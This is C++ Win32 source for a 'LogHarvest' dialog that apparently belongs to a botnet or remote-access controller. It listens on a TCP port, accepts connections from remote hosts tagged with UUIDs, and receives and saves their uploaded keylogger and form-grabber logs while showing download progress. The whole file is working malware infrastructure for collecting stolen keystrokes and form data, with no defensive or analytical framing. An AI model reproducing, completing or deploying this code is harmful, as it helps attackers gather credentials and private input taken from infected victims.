#include "logdialog.h"

extern HWND hWndPrefs;
extern HWND hWndg;
extern HINSTANCE hInst;
extern HTREEITEM LogHarvestTreeItem;

namespace logdialog{

UINT TotalItems = 0;
UINT TotalItemsActive = 0;
BOOL Listening = FALSE;
HWND WindowActive = FALSE;
LogHarvestThread *lpLogHarvestThread = NULL;
std::map<LONG, SOCKETMAP> SocketMap;
LONG ID = 0;

VOID PrintTotalItems(VOID){
	CHAR Text[64];
	sprintf(Text, "Total Items: %d/%d", TotalItemsActive, TotalItems);
	SetWindowText(GetDlgItem(WindowActive, IDC_TOTALITEMS), Text);
}

LogHarvestThread::LogHarvestThread(){
	StartThread();
}

BOOL LogHarvestThread::Listen(USHORT Port){
	LogSock.Create(SOCK_STREAM);
	if(LogSock.Bind(Port) == SOCKET_ERROR)
		return FALSE;
	if(LogSock.Listen(SOMAXCONN) == SOCKET_ERROR)
		return FALSE;
	LogSock.EventSelect(FD_ACCEPT);
	return TRUE;
}

VOID LogHarvestThread::StopListening(VOID){
	LogSock.Disconnect(CLOSE_SOCKET_HDL);
}

VOID LogHarvestThread::ThreadFunc(VOID){
	while(1){
		WSAEVENT hEvent = LogSock.GetEventHandle();
		if(!hEvent)
			Sleep(100);
		else
		if(WSAWaitForMultipleEvents(1, &hEvent, FALSE, INFINITE, FALSE) != WSA_WAIT_TIMEOUT){
			WSANETWORKEVENTS NetEvents;
			LogSock.EnumEvents(&NetEvents);
			if(NetEvents.lNetworkEvents & FD_ACCEPT){
				Socket AcceptSock;
				LogSock.Accept(AcceptSock);
				AcceptSock.EventSelect(FD_CLOSE|FD_READ);

				LVITEM LVItem;
				memset(&LVItem, 0, sizeof(LVItem));
				LVItem.mask = LVIF_TEXT | LVIF_PARAM;
				LVItem.iItem = ID;
				LVItem.iSubItem = 0;
				LVItem.lParam = LVItem.iItem;
				CHAR Temp[64];
				sprintf(Temp, "%s", inet_ntoa(SocketFunction::Stoin(AcceptSock.GetPeerAddr())));
				LVItem.pszText = Temp;
				LVItem.cchTextMax = strlen(Temp);
				ID = ListView_InsertItem(GetDlgItem(WindowActive, IDC_LIST), &LVItem);
				LVItem.iItem = ID;
				LVItem.lParam = ID;
				ListView_SetItem(GetDlgItem(WindowActive, IDC_LIST), &LVItem);
				SOCKETMAP SockMap;
				SockMap.BytesRead = 0;
				SockMap.FileSize = 0;
				//SockMap.Item = ID;
				SockMap.CurrentFile = 0;
				SockMap.ReadSinceLastTime = 0;
				SockMap.LastTime = GetTickCount();
				SockMap.Completed = FALSE;
				SockMap.Disconnected = FALSE;
				SocketMap.insert(std::make_pair(ID, SockMap));
				LVItem.iSubItem = 5;
				LVItem.pszText = "Connected";
				ListView_SetItem(GetDlgItem(WindowActive, IDC_LIST), &LVItem);
				//dprintf("Adding %d %d %d\r\n", AcceptSock.GetSocketHandle(), AcceptSock.GetEventHandle(), LogSock.GetLastError());
				SQList.Add(AcceptSock);
				ID++;
			}
		}
	}
}

VOID LogHarvestThread::LHQueue::OnAdd(VOID){
	UCHAR Key[32];
	memset(Key, 0, sizeof(Key));
	CFB CFB;
	CFB.SetKey(Key, 32);
	SocketList.back().Crypt(CFB);
	IDList.push_back(ID);
	TotalItems++;
	TotalItemsActive++;
	PrintTotalItems();
}

VOID LogHarvestThread::LHQueue::OnRead(VOID){
	SOCKETMAP SockMap = SocketMap[IDList[SignalledEvent]];
	LVFINDINFO LVFindInfo;
	LVFindInfo.flags = LVFI_PARAM;
	LVFindInfo.lParam = IDList[SignalledEvent];
	INT Item = ListView_FindItem(GetDlgItem(WindowActive, IDC_LIST), -1, &LVFindInfo);
	LVITEM LVItem;
	memset(&LVItem, 0, sizeof(LVItem));
	LVItem.iItem = Item;
	LVItem.mask = LVIF_TEXT;
	INT Return = 0;
	while((Return = RecvBufList[SignalledEvent].Read(SocketList[SignalledEvent])) > 0){
		Recheck:
		if(!RecvBufList[SignalledEvent].InRLMode()){
			if(RecvBufList[SignalledEvent].PopItem("\r\n", 2)){
				//dprintf("%s\r\n", RecvBuf[SignalledEvent].PoppedItem);
				PCHAR UUID = strtok(RecvBufList[SignalledEvent].PoppedItem, ":");
				PCHAR FileSize = NULL;
				PCHAR Flags = NULL;
				if(UUID)
					FileSize = strtok(NULL, ":");
				if(FileSize)
					Flags = strtok(NULL, ":");
				if(Flags){
					SockMap.BytesRead = 0;
					SockMap.FileSize = atoi(FileSize);
					SockMap.Flags = atoi(Flags);
					if(SockMap.FileSize <= 0){
						SocketList[SignalledEvent].Sendf("0");
						SockMap.CurrentFile++;
					}else{
						RecvBufList[SignalledEvent].StartRL(SockMap.FileSize);
						cRegistry Reg(HKEY_CURRENT_USER, REG_ROOT);
						CHAR Directory[MAX_PATH];
						Directory[0] = NULL;
						if(Reg.Exists(REG_LOGHARVESTDIR))
							strcpy(Directory, Reg.GetString(REG_LOGHARVESTDIR));
						if(strlen(Directory) > 0)
							strcat(Directory, "\\");
						do{
							SockMap.FileName[0] = NULL;
							SockMap.CurrentFile++;
							switch(SockMap.CurrentFile){
								case 1: if(SockMap.Flags & TRANSFER_KEYLOG) { sprintf(SockMap.FileName, "%sKL_%s.tx_", Directory, UUID); } break;
								case 2: if(SockMap.Flags & TRANSFER_FORMLOG) { sprintf(SockMap.FileName, "%sFM_%s.tx_", Directory, UUID); } break;
								default: SocketList[SignalledEvent].Shutdown(); break;
							}
						}while(!SockMap.FileName[0]);
						SockMap.File = fopen(SockMap.FileName, "w+Db");
					}
					SocketMap[IDList[SignalledEvent]] = SockMap;
					LVItem.iSubItem = 1;
					CHAR Temp[32];
					PCHAR DataType = "?";
					FLOAT FSize = SockMap.FileSize;
					if(FSize < 1024){
						DataType = "B";
					}else if(FSize > 1024 && FSize < 1048576){
						DataType = "KB";
						FSize /= 1024;
					}else if(FSize > 1048576 && FSize < 1073741824){
						DataType = "MB";
						FSize /= 1048576;
					}
					sprintf(Temp, "%0.3g %s", FSize, DataType);
					LVItem.pszText = Temp;
					ListView_SetItem(GetDlgItem(WindowActive, IDC_LIST), &LVItem);
					LVItem.iSubItem = 3;
					LVItem.pszText = "0 KB/s";
					ListView_SetItem(GetDlgItem(WindowActive, IDC_LIST), &LVItem);
					LVItem.iSubItem = 4;
					LVItem.pszText = UUID;
					ListView_SetItem(GetDlgItem(WindowActive, IDC_LIST), &LVItem);
					LVItem.iSubItem = 6;
					switch(SockMap.CurrentFile){
						case 1: LVItem.pszText = "KeyLog"; break;
						case 2: LVItem.pszText = "FormLog"; break;
					}
					ListView_SetItem(GetDlgItem(WindowActive, IDC_LIST), &LVItem);
					LVItem.iSubItem = 5;
					LVItem.pszText = "Downloading";
					ListView_SetItem(GetDlgItem(WindowActive, IDC_LIST), &LVItem);
					if(!SockMap.File){
						LVItem.iSubItem = 5;
						LVItem.pszText = "File Error";
						ListView_SetItem(GetDlgItem(WindowActive, IDC_LIST), &LVItem);
						SocketList[SignalledEvent].Shutdown();
						return;
					}
					if(SockMap.FileSize <= 0){
						LVItem.iSubItem = 2;
						LVItem.pszText = "100%";
						ListView_SetItem(GetDlgItem(WindowActive, IDC_LIST), &LVItem);
						goto Recheck;
					}
				}
			}
		}
		if(RecvBufList[SignalledEvent].InRLMode()){
			if(!SockMap.LastTime)
				SockMap.LastTime = GetTickCount();
			if((GetTickCount() - SockMap.LastTime) < 0)
				SockMap.LastTime = GetTickCount();
			if((GetTickCount() - SockMap.LastTime) >= 1000){
				CHAR Speed[64];
				sprintf(Speed, "%0.2g KB/s", float((float)SockMap.ReadSinceLastTime/1024));
				LVItem.iSubItem = 3;
				LVItem.pszText = Speed;
				ListView_SetItem(GetDlgItem(WindowActive, IDC_LIST), &LVItem);
				SockMap.ReadSinceLastTime = 0;
				SockMap.LastTime = GetTickCount();
			}
			BOOL Done = RecvBufList[SignalledEvent].PopRLBuffer();
			INT Size = RecvBufList[SignalledEvent].GetRLBufferSize();
			SockMap.BytesRead += Size;
			SockMap.ReadSinceLastTime += Size;
			SocketMap[IDList[SignalledEvent]] = SockMap;
			CHAR Percent[16];
			sprintf(Percent, "%0.3g%%", float(((float)SockMap.BytesRead / SockMap.FileSize)*100));
			LVItem.iSubItem = 2;
			LVItem.pszText = Percent;
			ListView_SetItem(GetDlgItem(WindowActive, IDC_LIST), &LVItem);

			DWORD BytesWritten;
			fwrite(RecvBufList[SignalledEvent].PoppedItem, 1, Size, SockMap.File);
			if(Done){
				UINT Uint = 0;
				while(SockMap.Flags){ SockMap.Flags = SockMap.Flags >> 1; Uint++; }
				SockMap.FileName[strlen(SockMap.FileName) - 1] = 't';			
				FILE* File2 = fopen(SockMap.FileName, "ab");
				if(!File2){
					LVItem.iSubItem = 5;
					LVItem.pszText = "File Error";
					ListView_SetItem(GetDlgItem(WindowActive, IDC_LIST), &LVItem);
					SocketList[SignalledEvent].Shutdown();
				}else{
					SocketList[SignalledEvent].Sendf("1");
					UCHAR Buffer[1024];
					INT BytesRead;
					fseek(SockMap.File, 0, SEEK_SET);
					while((BytesRead = fread(Buffer, 1, sizeof(Buffer), SockMap.File))){
						fwrite(Buffer, 1, BytesRead, File2);
					}
					fclose(SockMap.File);
					fclose(File2);
					if(SockMap.CurrentFile >= Uint){
						SocketList[SignalledEvent].Shutdown();
					}else{
						LVItem.iSubItem = 5;
						LVItem.pszText = "Done";
						ListView_SetItem(GetDlgItem(WindowActive, IDC_LIST), &LVItem);
						goto Recheck;
					}
				}
			}
		}
	}
}

VOID LogHarvestThread::LHQueue::OnRemove(VOID){
	LVFINDINFO LVFindInfo;
	LVFindInfo.flags = LVFI_PARAM;
	LVFindInfo.lParam = IDList[SignalledEvent];
	INT Item = ListView_FindItem(GetDlgItem(WindowActive, IDC_LIST), -1, &LVFindInfo);
	LVITEM LVItem;
	memset(&LVItem, 0, sizeof(LVItem));
	SOCKETMAP SockMap = SocketMap[IDList[SignalledEvent]];
	LVItem.iItem = Item;
	LVItem.iSubItem = 5;
	if(SockMap.BytesRead == SockMap.FileSize){
		LVItem.pszText = "Completed";
		SockMap.Completed = TRUE;
	}else{
		LVItem.pszText = "Disconnected";
		fclose(SockMap.File);
		SockMap.Disconnected = TRUE;
	}
	LVItem.mask = LVIF_TEXT;
	ListView_SetItem(GetDlgItem(WindowActive, IDC_LIST), &LVItem);
	SockMap.CurrentFile = 0;
	SocketMap[IDList[SignalledEvent]] = SockMap;
	IDList.erase(IDList.begin() + SignalledEvent);
	TotalItemsActive--;
	PrintTotalItems();
}

RECT ListRect;
UINT ControlDistance;

BOOL CALLBACK LogProc(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam){
	if(Msg == WM_INITDIALOG){
		SetWindowPos(hWnd, HWND_BOTTOM, NULL, NULL, NULL, NULL, SWP_NOSIZE | SWP_NOMOVE);
		if(WindowActive){
			SetActiveWindow(WindowActive);
			ShowWindow(WindowActive, SW_SHOW);
			DestroyWindow(hWnd);
		}else{
			WindowActive = hWnd;
			cRegistry Reg(HKEY_CURRENT_USER, REG_ROOT);
			SendMessage(GetDlgItem(hWnd, IDC_PORT), EM_LIMITTEXT, 5, 0);
			if(!Reg.Exists(REG_LOGHARVESTPORT))
				Reg.SetInt(REG_LOGHARVESTPORT, 51009);
			CHAR Temp[16];
			SetWindowText(GetDlgItem(hWnd, IDC_PORT), itoa(Reg.GetInt(REG_LOGHARVESTPORT), Temp, 10));
			LVCOLUMN LVColumn;
			LVColumn.mask = LVCF_FMT | LVCF_WIDTH | LVCF_TEXT;
			struct COLUMN{
				CHAR Name[16];
				INT Width;
				INT Format;
			};
			COLUMN Column[] = {
			{"Host", 120, LVCFMT_LEFT},
			{"Size", 70, LVCFMT_RIGHT},
			{"Done", 50, LVCFMT_CENTER},
			{"Speed", 70, LVCFMT_RIGHT},
			{"UUID", 220, LVCFMT_RIGHT},
			{"Status", 90, LVCFMT_CENTER},
			{"File", 80, LVCFMT_CENTER},
			};
			for(INT i = 0; i < 7; i++){
				LVColumn.pszText = Column[i].Name;
				LVColumn.cx = Column[i].Width;
				LVColumn.fmt = Column[i].Format;
				LVColumn.iSubItem = i;
				ListView_InsertColumn(GetDlgItem(hWnd, IDC_LIST), i, &LVColumn);
			}
			SendMessage(GetDlgItem(hWnd, IDC_LIST), LVM_SETEXTENDEDLISTVIEWSTYLE, LVS_EX_FULLROWSELECT, LVS_EX_FULLROWSELECT);
			GetWindowRect(GetDlgItem(hWnd, IDC_LIST), &ListRect);
			RECT R;
			GetWindowRect(GetDlgItem(hWnd, IDC_LIST), &R);
			ControlDistance = R.bottom;
			GetWindowRect(GetDlgItem(hWnd, IDC_TOTALITEMS), &R);
			ControlDistance = R.top - ControlDistance;
			if(!Reg.Exists(REG_LOGHARVESTX) || !Reg.Exists(REG_LOGHARVESTY) || !Reg.Exists(REG_LOGHARVESTW) || !Reg.Exists(REG_LOGHARVESTH)){
				RECT Rect;
				GetWindowRect(hWnd, &Rect);
				Reg.SetInt(REG_LOGHARVESTX, Rect.left);
				Reg.SetInt(REG_LOGHARVESTY, Rect.top);
				Reg.SetInt(REG_LOGHARVESTW, Rect.right - Rect.left);
				Reg.SetInt(REG_LOGHARVESTH, Rect.bottom - Rect.top);
			}else{
				MoveWindow(hWnd, Reg.GetInt(REG_LOGHARVESTX), Reg.GetInt(REG_LOGHARVESTY), Reg.GetInt(REG_LOGHARVESTW), Reg.GetInt(REG_LOGHARVESTH), TRUE);
			}
		}
		if(Listening){
			SetWindowText(GetDlgItem(hWnd, IDC_LISTEN), "Stop Listening");
			EnableWindow(GetDlgItem(hWnd, IDC_PORT), FALSE);
		}else{
			SetWindowText(GetDlgItem(hWnd, IDC_LISTEN), "Listen");
			EnableWindow(GetDlgItem(hWnd, IDC_PORT), TRUE);
		}
	}else
	if(Msg == WM_COMMAND){
		if(HIWORD(wParam) == BN_CLICKED){
			switch(LOWORD(wParam)){
				case IDC_CLOSE:
					ShowWindow(hWnd, SW_HIDE);
				break;
				case IDC_LISTEN:
					if(Listening == FALSE){
						CHAR Temp[16];
						GetWindowText(GetDlgItem(hWnd, IDC_PORT), Temp, sizeof(Temp));
						if(!lpLogHarvestThread)
							lpLogHarvestThread = new LogHarvestThread;
						if(!lpLogHarvestThread->Listen(atoi(Temp))){
							MessageBox(NULL, "Could not listen on port", "Error", MB_OK | MB_ICONEXCLAMATION);
						}else{
							SetWindowText(GetDlgItem(hWnd, IDC_LISTEN), "Stop Listening");
							EnableWindow(GetDlgItem(hWnd, IDC_PORT), FALSE);
							cRegistry Reg(HKEY_CURRENT_USER, REG_ROOT);
							Reg.SetInt(REG_LOGHARVESTPORT, atoi(Temp));
							Listening = TRUE;
						}
					}else{
						lpLogHarvestThread->StopListening();
						SetWindowText(GetDlgItem(hWnd, IDC_LISTEN), "Listen");
						EnableWindow(GetDlgItem(hWnd, IDC_PORT), TRUE);
						Listening = FALSE;
					}
				break;
				case IDC_SETTINGS:
					if(!hWndPrefs)
						hWndPrefs = CreateDialog(hInst, MAKEINTRESOURCE(IDD_PREFERENCES), hWndg, (DLGPROC)PreferencesProc);
					SetActiveWindow(hWndPrefs);
					ShowWindow(hWndPrefs, SW_SHOW);
					TreeView_SelectItem(GetDlgItem(hWndPrefs, IDC_TREE), LogHarvestTreeItem);
				break;
			}
		}
	}else
	if(Msg == WM_NCCALCSIZE){
		if(wParam == TRUE){
			LPNCCALCSIZE_PARAMS P = (LPNCCALCSIZE_PARAMS)lParam;
			RECT R, R2;
			POINT p;
			INT WC = ((P->rgrc[0].right - P->rgrc[0].left) - (P->rgrc[1].right - P->rgrc[1].left));
			INT HC = ((P->rgrc[0].bottom - P->rgrc[0].top) - (P->rgrc[1].bottom - P->rgrc[1].top));
			INT Width, Height;

			Width = WC + (ListRect.right - ListRect.left);
			Height = HC + (ListRect.bottom - ListRect.top);
			SetWindowPos(GetDlgItem(hWnd, IDC_LIST), NULL, NULL, NULL, Width, Height, SWP_NOMOVE);
			ListRect.right = Width;
			ListRect.left = 0;
			ListRect.bottom = Height;
			ListRect.top = 0;
			GetWindowRect(GetDlgItem(hWnd, IDC_LIST), &R);
			p.y = R.bottom + ControlDistance;
			p.x = R.left;
			ScreenToClient(hWnd, &p);
			SetWindowPos(GetDlgItem(hWnd, IDC_TOTALITEMS), NULL, p.x, p.y, NULL, NULL, SWP_NOSIZE);

			GetWindowRect(GetDlgItem(hWnd, IDC_GROUP), &R);
			Width = WC + (R.right - R.left);
			Height = (R.bottom - R.top);
			SetWindowPos(GetDlgItem(hWnd, IDC_GROUP), NULL, NULL, NULL, Width, Height, SWP_NOMOVE);

			GetWindowRect(GetDlgItem(hWnd, IDC_CLOSE), &R);
			p.y = R.top;
			p.x = R.left;
			ScreenToClient(hWnd, &p);
			SetWindowPos(GetDlgItem(hWnd, IDC_CLOSE), NULL, p.x + WC, p.y, NULL, NULL, SWP_NOSIZE);

			GetWindowRect(GetDlgItem(hWnd, IDC_SETTINGS), &R);
			p.y = R.top;
			p.x = R.left;
			ScreenToClient(hWnd, &p);
			SetWindowPos(GetDlgItem(hWnd, IDC_SETTINGS), NULL, p.x + WC, p.y, NULL, NULL, SWP_NOSIZE);
		}
	}else
	if(Msg == WM_GETMINMAXINFO){
		LPMINMAXINFO M = (LPMINMAXINFO)lParam;
		M->ptMinTrackSize.y = 120;
		M->ptMinTrackSize.x = 370;
	}else
	if(Msg == WM_NOTIFY){
		if(wParam == IDC_LIST){
			LPNMITEMACTIVATE Item = (LPNMITEMACTIVATE)lParam;
			if(Item->hdr.code == NM_RCLICK){
				if(SocketMap.size() > 0){
					HMENU hMenu = CreatePopupMenu();
					UINT Flags = MF_BYPOSITION|MF_STRING;
					InsertMenu(hMenu, 0, Flags, 1, "Clear Completed");
					POINT P;
					GetCursorPos(&P);
					INT Return = TrackPopupMenu(hMenu, TPM_LEFTALIGN | TPM_RETURNCMD, P.x, P.y, 0, hWnd, NULL);
					if(Return > 0){
						if(Return == 1){
							std::map<LONG, SOCKETMAP>::iterator SockMap = SocketMap.begin();
							while(SockMap != SocketMap.end()){
								if(SockMap->second.Completed || SockMap->second.Disconnected){
									LVFINDINFO LVFindInfo;
									LVFindInfo.flags = LVFI_PARAM;
									LVFindInfo.lParam = SockMap->first;
									INT Item = ListView_FindItem(GetDlgItem(hWnd, IDC_LIST), -1, &LVFindInfo);
									ListView_DeleteItem(GetDlgItem(hWnd, IDC_LIST), Item);
									TotalItems--;
									std::map<LONG, SOCKETMAP>::iterator SockMapDel = SockMap;
									SockMap++;
									SocketMap.erase(SockMapDel);
								}else
									SockMap++;
							}
							PrintTotalItems();
						}
					}
				}
			}
		}
	}else
	if(Msg == WM_EXITSIZEMOVE){
		cRegistry Reg(HKEY_CURRENT_USER, REG_ROOT);
		RECT Rect;
		GetWindowRect(hWnd, &Rect);
		Reg.SetInt(REG_LOGHARVESTX, Rect.left);
		Reg.SetInt(REG_LOGHARVESTY, Rect.top);
		Reg.SetInt(REG_LOGHARVESTW, Rect.right - Rect.left);
		Reg.SetInt(REG_LOGHARVESTH, Rect.bottom - Rect.top);
	}else
	if(Msg == WM_CLOSE){
		ShowWindow(hWnd, SW_HIDE);
	}

	return 0;
}

BOOL IsActive(VOID){
	if(!WindowActive)
		return FALSE;
	return IsWindowVisible(WindowActive);
}

}